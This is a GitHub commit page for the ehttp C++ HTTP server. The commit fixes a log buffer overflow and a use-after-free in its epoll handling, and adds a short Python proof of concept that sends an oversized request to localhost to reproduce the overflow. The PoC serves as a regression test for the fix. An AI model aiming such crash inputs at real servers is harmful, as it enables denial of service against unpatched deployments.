* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c394bb0f_20250111_125147.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fcommit%2F17405b975948abc216f6a085d2d027ec1cfd5766)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fcommit%2F17405b975948abc216f6a085d2d027ec1cfd5766)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=hongliuliao%2Fehttp)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[hongliuliao](/hongliuliao)
/
**[ehttp](/hongliuliao/ehttp)**
Public

* [Notifications](/login?return_to=%2Fhongliuliao%2Fehttp) You must be signed in to change notification settings
* [Fork
  110](/login?return_to=%2Fhongliuliao%2Fehttp)
* [Star
   317](/login?return_to=%2Fhongliuliao%2Fehttp)

* [Code](/hongliuliao/ehttp)
* [Issues
  0](/hongliuliao/ehttp/issues)
* [Pull requests
  0](/hongliuliao/ehttp/pulls)
* [Actions](/hongliuliao/ehttp/actions)
* [Projects
  0](/hongliuliao/ehttp/projects)
* [Wiki](/hongliuliao/ehttp/wiki)
* [Security](/hongliuliao/ehttp/security)
* [Insights](/hongliuliao/ehttp/pulse)

Additional navigation options

* [Code](/hongliuliao/ehttp)
* [Issues](/hongliuliao/ehttp/issues)
* [Pull requests](/hongliuliao/ehttp/pulls)
* [Actions](/hongliuliao/ehttp/actions)
* [Projects](/hongliuliao/ehttp/projects)
* [Wiki](/hongliuliao/ehttp/wiki)
* [Security](/hongliuliao/ehttp/security)
* [Insights](/hongliuliao/ehttp/pulse)

## Commit

[Permalink](/hongliuliao/ehttp/commit/17405b975948abc216f6a085d2d027ec1cfd5766)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix log overflow & epoll\_context use after free bug

[Browse files](/hongliuliao/ehttp/tree/17405b975948abc216f6a085d2d027ec1cfd5766)
Browse the repository at this point in the history

* Loading branch information

[![@hongliuliao](https://avatars.githubusercontent.com/u/1174006?s=40&v=4)](/hongliuliao)

[hongliuliao](/hongliuliao/ehttp/commits?author=hongliuliao "View all commits by hongliuliao")
committed
Oct 8, 2023

1 parent
[716ff7a](/hongliuliao/ehttp/commit/716ff7a60a28a943855d8811eda44c611d58b349)

commit 17405b9

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**15 additions**
and
**8 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* Makefile
  [Makefile](#diff-76ed074a9305c04054cdebb9e9aad2d818052b07091de1f20cad0bbac34ffb52)
* src

  + src/epoll\_socket.cpp
    [epoll\_socket.cpp](#diff-86957759593d445fd3fb9bf4e86b8f2921e35c8d99c86f45c0fb29b0bff4d7e2)
  + src/sim\_parser.cpp
    [sim\_parser.cpp](#diff-54a4cc04a1faa3d5647e4929eb168179ff7a7b652470767b24715282927bbf45)
* test/issue38

  + test/issue38/poc.py
    [poc.py](#diff-23b1518c2771196532bc7774146924a851a9104672c6d92b7ee62c433ca9a0e7)

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[Makefile](#diff-76ed074a9305c04054cdebb9e9aad2d818052b07091de1f20cad0bbac34ffb52 "Makefile")

Show comments

[View file](/hongliuliao/ehttp/blob/17405b975948abc216f6a085d2d027ec1cfd5766/Makefile)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5,8 +5,8 @@ CXXFLAGS += -g -Wall |
|  |  | LDFLAGS += -pthread |
|  |  |  |
|  |  | ifdef ACOV |
|  |  | CXXFLAGS += -fprofile-arcs -ftest-coverage |
|  |  | LDFLAGS += -lgcov --coverage |
|  |  | CXXFLAGS += -fprofile-arcs -ftest-coverage -fsanitize=address |
|  |  | LDFLAGS += -lgcov --coverage -fsanitize=address |
|  |  | endif |
|  |  |  |
|  |  | MULTIPART\_PARSER\_INC\_PATH=-I deps/multipart-parser-c/ |
| Expand Down | |  |

8 changes: 3 additions & 5 deletions

8
[src/epoll\_socket.cpp](#diff-86957759593d445fd3fb9bf4e86b8f2921e35c8d99c86f45c0fb29b0bff4d7e2 "src/epoll_socket.cpp")

Show comments

[View file](/hongliuliao/ehttp/blob/17405b975948abc216f6a085d2d027ec1cfd5766/src/epoll_socket.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -228,11 +228,6 @@ int EpollSocket::handle\_accept\_event(int &epollfd, epoll\_event &event, EpollSock |
|  |  | void read\_func(void \*data) { |
|  |  | TaskData \*td = (TaskData \*) data; |
|  |  | td->es->handle\_readable\_event(td->event); |
|  |  |  |
|  |  | EpollContext \*hc = (EpollContext \*) td->event.data.ptr; |
|  |  | if (hc != NULL) { |
|  |  | hc->\_ctx\_status = CONTEXT\_READ\_OVER; |
|  |  | } |
|  |  | delete td; |
|  |  | } |
|  |  |  |
| Expand All | | @@ -248,6 +243,9 @@ int EpollSocket::handle\_readable\_event(epoll\_event &event) { |
|  |  | if (ret == READ\_CLOSE) { |
|  |  | return close\_and\_release(event); |
|  |  | } |
|  |  | if (epoll\_context != NULL) { |
|  |  | epoll\_context->\_ctx\_status = CONTEXT\_READ\_OVER; |
|  |  | } |
|  |  |  |
|  |  | if (ret == READ\_CONTINUE) { |
|  |  | event.events = EPOLLIN | EPOLLONESHOT; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/sim\_parser.cpp](#diff-54a4cc04a1faa3d5647e4929eb168179ff7a7b652470767b24715282927bbf45 "src/sim_parser.cpp")

Show comments

[View file](/hongliuliao/ehttp/blob/17405b975948abc216f6a085d2d027ec1cfd5766/src/sim_parser.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -577,7 +577,7 @@ int Request::parse\_request(const char \*read\_buffer, int read\_size) { |
|  |  | LOG\_INFO("TOO BIG REQUEST WE WILL REFUSE IT! MAX\_REQ\_SIZE:%d", MAX\_REQ\_SIZE); |
|  |  | return -1; |
|  |  | } |
|  |  | LOG\_DEBUG("read from client: size:%d, content:%s", read\_size, read\_buffer); |
|  |  | LOG\_DEBUG("read from client: size:%d, content:%.4096s", read\_size, read\_buffer); |
|  |  | ssize\_t nparsed = http\_parser\_execute(&\_parser, &\_settings, read\_buffer, read\_size); |
|  |  | if (nparsed != read\_size) { |
|  |  | std::string err\_msg = "unkonw"; |
| Expand Down | |  |

9 changes: 9 additions & 0 deletions

9
[test/issue38/poc.py](#diff-23b1518c2771196532bc7774146924a851a9104672c6d92b7ee62c433ca9a0e7 "test/issue38/poc.py")

Show comments

[View file](/hongliuliao/ehttp/blob/17405b975948abc216f6a085d2d027ec1cfd5766/test/issue38/poc.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,9 @@ |
|  |  | #!/usr/bin/env python3 |
|  |  |  |
|  |  | import socket |
|  |  |  |
|  |  | sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) |
|  |  | sock.connect(("localhost", 8080)) |
|  |  | sock.send(b"GET"\*5000+b" /hello"\*5000+b" HTTP/1.1\r\nHost:localhost:8080\r\n\r\n") |
|  |  | response = sock.recv(4096) |
|  |  | sock.close() |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `17405b9`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhongliuliao%2Fehttp%2Fcommit%2F17405b975948abc216f6a085d2d027ec1cfd5766) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


